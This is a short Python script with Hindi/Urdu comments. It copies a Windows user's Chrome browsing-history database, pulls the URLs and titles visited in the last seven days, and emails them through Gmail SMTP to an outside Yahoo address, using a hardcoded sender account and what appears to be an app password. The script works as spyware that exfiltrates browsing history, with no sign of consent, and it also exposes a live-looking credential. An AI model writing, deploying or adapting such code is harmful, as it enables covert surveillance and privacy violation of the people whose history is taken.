import os
import shutil
import sqlite3
import smtplib
from email.mime.text import MIMEText
from datetime import datetime, timedelta, timezone

# Chrome history ka path
history_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default\History"
temp_path = os.path.expanduser('~') + r"\AppData\Local\Temp\History"

try:
    shutil.copy2(history_path, temp_path)
except Exception as e:
    print("Error copying history file:", e)
    exit()

# 7 din pehle ka timestamp (Chrome format: microseconds since 1601-01-01)
epoch_start = datetime(1601, 1, 1, tzinfo=timezone.utc)
seven_days_ago = datetime.now(timezone.utc) - timedelta(days=7)
seven_days_ago_timestamp = int((seven_days_ago - epoch_start).total_seconds() * 1000000)

try:
    conn = sqlite3.connect(temp_path)
    cursor = conn.cursor()
    cursor.execute("SELECT url, title, last_visit_time FROM urls WHERE last_visit_time > ? ORDER BY last_visit_time DESC LIMIT 100", (seven_days_ago_timestamp,))
    history_data = ""
    for row in cursor.fetchall():
        visit_time = epoch_start + timedelta(microseconds=row[2])
        history_data += f"URL: {row[0]}\nTitle: {row[1]}\nLast Visit Time: {visit_time}\n{'-'*50}\n"
    conn.close()
    os.remove(temp_path)
except Exception as e:
    print("Error reading history:", e)
    exit()

# Email settings
sender = "khawarmuhammadhamza@gmail.com"
receiver = "akeel_hafeez@yahoo.com"
password = "ygmb afvj bjcl efgq"  

msg = MIMEText(history_data)
msg['Subject'] = 'Chrome History (Last 7 Days, Max 300)'
msg['From'] = sender
msg['To'] = receiver

try:
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
        server.login(sender, password)
        server.sendmail(sender, receiver, msg.as_string())
    print("Email sent!")
except Exception as e:
    print("Error sending email:", e)
